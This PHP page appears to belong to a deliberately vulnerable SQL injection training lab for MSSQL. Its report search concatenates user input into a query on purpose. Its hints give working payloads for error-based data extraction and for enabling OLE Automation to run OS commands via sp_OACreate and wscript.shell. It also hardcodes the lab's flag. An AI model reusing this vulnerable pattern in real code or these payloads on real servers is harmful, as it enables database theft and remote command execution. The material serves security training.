<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab8_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab8", $mode));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        // Simulation fallback
        if ($submitted === 'FLAG{ms_sp_04cr34t3_rc3}') {
            $_SESSION['mssql_lab8_solved'] = true;
            header("Location: " . url_lab_from_slug("mssql/lab8", $mode));
            exit;
        } else {
            $verify_error = "Incorrect. Keep trying!";
        }
    }
}
?>
<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 8: sp_OACreate: COM Object RCE</h3>

    <h4>Scenario</h4>
    <p>
        A reporting dashboard queries MSSQL for analytics data. The application
        connects with <strong>sysadmin</strong> privileges, and error messages are displayed.
        In this environment, <code>xp_cmdshell</code> has been <strong>permanently disabled</strong>
        and cannot be re-enabled.
    </p>
    <p>
        However, MSSQL has another RCE vector: <strong>OLE Automation Procedures</strong>
        (<code>sp_OACreate</code>, <code>sp_OAMethod</code>). These can instantiate COM
        objects like <code>wscript.shell</code> to execute OS commands.
    </p>
    <p>
        <em>Note: OLE Automation and COM objects are Windows-only features. On Linux MSSQL,
        the attack chain is demonstrated conceptually. The flag is extracted via CONVERT error-based injection.</em>
    </p>

    <h4>Objective</h4>
    <p>
        Extract the flag from the <code>flags</code> table using error-based extraction.
        The solution also explains the <code>sp_OACreate</code> COM object RCE technique.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Extract flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code><br>
        2. Enable OLE: <code>'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; -- -</code><br>
        3. Create COM: <code>'; DECLARE @obj INT; EXEC sp_OACreate 'wscript.shell', @obj OUTPUT; EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd /c whoami > C:\temp\out.txt'; -- -</code><br>
        4. This is conceptual: the actual solve uses CONVERT error-based extraction.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab8_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag and learned about sp_OACreate COM object RCE on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Analytics Dashboard</h4>
    <form method="POST" class="form-row">
<input type="text" name="report" class="input" placeholder="Report name (try: sales)" value="<?= htmlspecialchars($_POST['report'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Load Report</button>
    </form>
</div>

<?php
if (isset($_POST['report'])) {
    $report = $_POST['report'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, report_name, summary, created_at FROM reports WHERE report_name LIKE '%$report%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No reports found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['report_name'] ?? '') . '</strong>';
                    echo ' <span style="color:#888;">(' . htmlspecialchars($row['created_at'] ?? '') . ')</span><br>';
                    echo htmlspecialchars($row['summary'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
